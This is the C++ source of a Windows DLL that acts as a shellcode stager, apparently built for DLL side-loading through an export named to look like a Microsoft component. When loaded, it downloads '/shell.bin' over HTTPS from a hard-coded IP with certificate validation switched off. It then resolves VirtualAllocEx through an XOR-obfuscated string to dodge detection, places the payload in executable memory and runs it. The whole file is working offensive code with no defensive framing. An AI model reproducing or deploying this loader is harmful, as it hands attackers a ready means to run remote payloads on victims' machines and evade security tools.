#include "pch.h"
#include <Windows.h>
#include <WinInet.h>
#include <iostream>
#include <iomanip>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Wininet.lib")

void decode_string(unsigned char* key, unsigned char* text, int size) {
    for (int x = 0; x < size; x++) {
        text[x] = text[x] ^ key[x];
    }
    return;
}

FARPROC load_func(LPCWSTR lib, LPCSTR function) {
    HMODULE hDLL = GetModuleHandle(L"kernel32");
    FARPROC x = GetProcAddress(hDLL, function);
    return x;
}

void do_shit() {
    
    // Open a WinHttp session
    HINTERNET hSession = WinHttpOpen(L"HTTPSClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
       
        return;
    }

    // Force TLS 1.2
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    // Connect to server
    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.120.152", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
     
        WinHttpCloseHandle(hSession);
        return;
    }

    // Open request
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shell.bin",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Send request
    BOOL bResult = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0);
    if (!bResult) {
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Receive response
    bResult = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResult) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Read data
    DWORD dwSize = 0;
    WinHttpQueryDataAvailable(hRequest, &dwSize);

      
        DWORD bytesRead = 0;


        HANDLE processHandle = GetCurrentProcess();
        LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
        unsigned char vk[] = "\xf6\xa3\x29\xed\x46\xa1\x32\x6c\xb4\x9a\x83\xc9\xfc\x3d";
        unsigned char vx[] = "\xa0\xca\x5b\x99\x33\xc0\x5e\x2d\xd8\xf6\xec\xaa\xb9\x45";

        decode_string(vk, vx, sizeof vx);

        (FARPROC&)VirtualAllocEx = load_func((LPCWSTR)"kernel32", (LPCSTR)vx);
        LPVOID lpMemory = VirtualAllocEx(processHandle, NULL, dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        
    
    WinHttpReadData(hRequest, lpMemory, dwSize, &bytesRead);
   
    char* char_ptr = static_cast<char*>(lpMemory);
    ((void(*)())char_ptr)();


        VirtualFree(lpMemory, 0, MEM_RELEASE);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
     
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        do_shit();
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL WINAPI DoMsCtfMonitor(void) {
        do_shit();
        return TRUE;
    }
}

